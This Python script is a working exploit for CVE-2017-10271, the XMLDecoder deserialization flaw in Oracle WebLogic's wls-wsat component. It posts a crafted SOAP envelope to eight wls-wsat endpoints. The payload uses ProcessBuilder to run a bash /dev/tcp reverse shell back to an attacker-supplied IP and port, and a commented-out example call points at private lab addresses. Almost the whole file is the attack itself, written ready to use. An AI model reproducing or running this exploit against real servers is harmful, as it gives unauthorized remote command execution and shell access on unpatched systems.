#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Time       : 2023/4/11 22:04
# Author     : yunkong
# FileName   : cve_2017_10271_exp.py
# Description:
#
# Exploit Title: Weblogic < 10.3.6 'wls-wsat' XMLDecoder 反序列化漏洞（CVE-2017-10271）
# Version: 10.3.6.0.0, 12.1.3.0.0, 12.2.1.1.0, 12.2.1.2.0
# CVE: CVE-2017-10271
import requests


def exploit_cve_2017_10271(target_url, exp_ip, exp_port):
    wls_wsat_list = ["/wls-wsat/CoordinatorPortType",
                     "/wls-wsat/RegistrationPortTypeRPC",
                     "/wls-wsat/ParticipantPortType",
                     "/wls-wsat/RegistrationRequesterPortType ",
                     "/wls-wsat/CoordinatorPortType11",
                     "/wls-wsat/RegistrationPortTypeRPC11 ",
                     "/wls-wsat/ParticipantPortType11",
                     "/wls-wsat/RegistrationRequesterPortType11"]
    headers = {
        "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
        "Content-Type": "text/xml"
    }
    data = f'<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> ' \
           f'<soapenv:Header><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java ' \
           f'version="1.4.0" class="java.beans.XMLDecoder"><void class="java.lang.ProcessBuilder"><array ' \
           f'class="java.lang.String" length="3"><void index="0"><string>/bin/bash</string></void><void ' \
           f'index="1"><string>-c</string></void><void index="2"><string>bash -i &gt;&amp; /dev/tcp/{exp_ip}/' \
           f'{exp_port} 0&gt;&amp;1</string></void></array><void ' \
           f'method="start"/></void></java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope> '
    proxy = {
        'http': '127.0.0.1:8080',
        'https': '127.0.0.1:8080'
    }
    for wls_wsat in wls_wsat_list:
        requests.request(method="POST",
                         # proxies=proxy,
                         url=target_url + wls_wsat,
                         data=data,
                         headers=headers)


def vuln_scan_start(target_url, exp_ip, exp_port):
    exploit_cve_2017_10271(target_url, exp_ip, exp_port)


# vuln_scan_start("http://192.168.12.130:7001", "192.168.12.152", "5555")
